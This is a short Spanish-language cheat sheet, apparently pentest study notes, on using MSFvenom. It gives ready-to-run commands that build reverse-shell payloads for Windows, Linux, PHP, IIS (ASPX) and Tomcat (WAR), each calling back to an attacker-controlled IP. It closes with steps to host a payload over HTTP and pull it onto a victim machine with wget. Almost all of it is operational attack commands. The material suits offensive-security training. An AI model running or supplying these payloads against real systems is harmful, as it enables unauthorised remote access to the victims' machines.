# MSFvenom: Generar Nuestros Propios Payloads

Msfvenom genera archivos maliciosos (payloads) que al ejecutarse en la victima nos devuelven una shell.

## Payload para Windows (64 bits)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f exe -o pwned.exe
```

**Parametros:**
- `-p` -> Payload a utilizar (meterpreter reverse TCP para Windows x64)
- `LHOST` -> Nuestra IP (donde recibiremos la conexion)
- `LPORT` -> Puerto donde escucharemos
- `-f exe` -> Formato de salida (ejecutable Windows)
- `-o pwned.exe` -> Nombre del archivo generado

## Payload para Windows (32 bits)

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f exe -o virus.exe
```

## Payload para Linux (64 bits)

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f elf -o payload.elf
```

## Payload PHP para Web

```bash
msfvenom -p php/reverse_php LHOST=<IP_atacante> LPORT=<puerto> -f raw > pwned.php
```

## Payload ASPX para IIS

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f aspx -o shell.aspx
```

## Payload WAR para Tomcat

```bash
msfvenom -p java/shell_reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f war -o reverse1.war
```

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP_atacante> LPORT=<puerto> -f war -o reverse2.war
```

> Dependiendo de la version de Tomcat puede funcionar uno u otro.

## Servir y Recibir el Payload

1. Servir con Python: `python3 -m http.server 80`
2. Descargar en victima: `wget http://<IP_atacante>/pwned.exe`
3. Configurar Metasploit Multi/Handler (ver apartado siguiente)
